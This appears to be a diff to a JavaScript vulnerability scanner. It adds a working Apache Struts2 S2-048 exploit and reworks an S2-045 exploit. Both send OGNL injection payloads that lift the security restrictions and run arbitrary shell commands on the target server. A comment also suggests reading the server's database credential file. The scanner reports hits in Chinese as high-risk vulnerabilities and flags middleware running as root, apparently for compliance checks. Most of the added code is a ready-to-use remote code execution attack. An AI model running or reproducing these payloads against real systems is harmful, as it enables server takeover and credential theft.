@@ -156,38 +156,88 @@ function fnTest(s)
 	  );
 }
 
+var g_postData = null, g_szCmd = "echo whoami:;whoami;echo pwd:;pwd;echo cmdend";
+function doStruts2_048(url,cmd,fnCbk)
+{
+	var szCmd = cmd || g_szCmd;
+	var payload = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." + 
+		"(#_memberAccess?(#_memberAccess=#dm):" + 
+		"((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." + 
+		"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))" + 
+		".(#ognlUtil.getExcludedPackageNames().clear())"+ 
+	 	".(#ognlUtil.getExcludedClasses().clear())" + 
+		".(#context.setMemberAccess(#dm)))).(#cmd='" + szCmd + "')" + 
+		".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))" + 
+		".(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))" + 
+		".(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true))" + 
+		".(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))" + 
+		".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+
+    // g_postData ||
+    var data = {
+        "name": g_postData || payload,
+        "age": 20
+    };
+    request({method: 'POST',uri: url,"formData":data,"headers":{Referer:url}},
+    	function(e,r,b)
+    {
+    	fnDoBody(b,"s2-048");
+    	// console.log(e || b || r);
+    });
+}
+
+function fnDoBody(body,t)
+{
+	var i = body.indexOf("cmdend") || body.indexOf("<!DOCTYPE") || body.indexOf("<html") || body.indexOf("<body");
+	if(i) body = body.substr(0, i).trim();
+	if(!body)return;
+	// console.log(body);
+	g_oRst.struts2 || (g_oRst.struts2 = {});
+	var oT = g_oRst.struts2 = {},s1 = String(body).split(/\n/);
+	oT[t] = "发现struts2高危漏洞" + t + "，请尽快升级";
+	if(-1 < body.indexOf("root"))
+		oT["root"] = "中间件不应该用root启动，不符合公司上线检查表要求";
+	if(s1[0] && 50 > s1[0].length)
+		oT["user"] = "当前中间件启动的用户：" + (-1 < s1[0].indexOf('whoami')? s1[1]:s1[0]);
+	if(1 < s1.length)
+		oT["CurDir"] = {des:"当前中间件目录","path":3 < s1.length ? s1[3] : s1[1]};
+}
+
+
 function doStruts2_045(url,cmd,fnCbk)
 {
-	var szCmd = cmd || "whoami";//  && cat #curPath/WEB-INF/jdbc.propertis
+	// ,"echo ls:;ls;echo pwd:;pwd;echo whoami:;whoami"
+	var szCmd = cmd || g_szCmd;//  && cat #curPath/WEB-INF/jdbc.propertis
 	request({method: 'POST',uri: url
 	    ,headers:
 	    {
-	    	"Content-Type":"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear())"
-	    		+ ".(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm))))"
-				+ ".(#cmd='" + szCmd + "')"
-				+ ".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))"
-				+ ".(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))"
-				+ ".(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())"
-				+ ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))"
-				+ ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))"
-				// + ".(#ros.write('curPath '.getBytes()))"
-			    + ".(#ros.write(@org.apache.struts2.ServletActionContext@getRequest().getServletContext().getRealPath('.').getBytes()))"
-	    		+ ".(#ros.flush()).(#ros.close())}"
+	    	"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
+	    	"Content-Type":g_postData = 
+	    	    ("%{(#nike='multipart/form-data')"
+		+ ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)" 
+		+ ".(#_memberAccess?(#_memberAccess=#dm):" 
+			+ "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])" 
+			+ ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
+			+ ".(#ognlUtil.getExcludedPackageNames().clear())"
+		+ ".(#ognlUtil.getExcludedClasses().clear())"
+		+ ".(#context.setMemberAccess(#dm))))"
+		+ ".(#cmd='" + szCmd + "')"
+		+ ".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))"
+		+ ".(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))"
+		+ ".(#p=new java.lang.ProcessBuilder(#cmds))"
+		+ ".(#p.redirectErrorStream(true)).(#process=#p.start())"
+		+ ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse()"
+		+ ".getOutputStream()))"
+	    // 我添加的当前位置行加上后，会无法输出
+	    // + ".(#ros.write(@org.apache.struts2.ServletActionContext@getRequest().getServletContext().getRealPath('.').getBytes()))"
+		+ ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))"
+		+ ".(#ros.flush())}")
+	    	    // .(#ros.close())
 	    }}
 	  , function (error, response, body){
 	  		if(body)
 	  		{
-	  			if(-1 < body.indexOf("<html") || -1 < body.indexOf("<title>"))return;
-
-	  			// console.log(body);
-	  			g_oRst.struts2 || (g_oRst.struts2 = {});
-	  			var oT = g_oRst.struts2 = {"s2-045":"发现struts2高危漏洞s2-045，请尽快升级"},s1 = String(body).split(/\n/);
-	  			if(-1 < s1[0].indexOf("root"))
-	  				oT["root"] = "中间件不应该用root启动，不符合公司上线检查表要求";
-	  			if(s1[0] && 50 > s1[0].length)
-	  				oT["user"] = "当前中间件启动的用户：" + s1[0];
-	  			if(1 < s1.length)
-	  				oT["CurDir"] = {des:"当前中间件目录","path":s1[1]};
+	  			fnDoBody(body,"s2-045");
 	  		}
 	  		// console.log(body);
 	    }
@@ -208,6 +258,7 @@ function fnTestAll()
 if(0 < a.length)
 {
 	doStruts2_045(url);
+	doStruts2_048(url);
 	fnTestAll();
 }
 // checkWeblogicT3("192.168.10.133",9001);
